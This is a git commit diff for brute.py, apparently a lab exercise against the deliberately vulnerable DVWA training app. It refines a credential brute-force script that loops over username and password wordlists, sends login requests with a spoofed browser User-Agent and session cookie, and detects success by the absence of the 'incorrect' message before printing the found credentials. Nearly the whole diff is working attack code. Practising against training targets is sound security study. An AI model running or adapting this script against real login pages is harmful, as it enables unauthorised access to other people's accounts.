a3cafaedf2259609e3ffd07f8437656b49849bca
dojo <penamarth@gmail.com>
2021-10-15 13:27:29 -0400

    modified:   brute.py 	new file:   password 	new file:   username

--- PR2/DVWABRUTE/brute.py
+++ PR2/DVWABRUTE/brute.py
@@ -3,7 +3,11 @@
 NAMEFILE = "namelist.txt"
 PASSFILE = "500-worst-passwords.txt"
 
+#NAMEFILE = "username"
+#PASSFILE = "password"
+
 import requests
+import json
 from http import cookies
 
 c = cookies.SimpleCookie()
@@ -29,9 +33,10 @@ finally:
 for user in usernames:
     for password in passwords:
 
-        response = requests.get(url,headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0'}, params = {'username' : user, 'password' : password, 'Login' : "Login"}, cookies=cook)
+        response = requests.get(url,headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0'}, params = {'username' : user.strip(), 'password' : password.strip(), 'Login' : "Login"}, cookies=cook)
 
-        if response.status_code == 200:
-            print(response.text)
-
-
+#        print(response.text)
+        if response.status_code == 200 and not 'Username and/or password incorrect.' in response.text:
+            
+            print("Sucess! User: " + user + " Password: " + password)
+            exit()
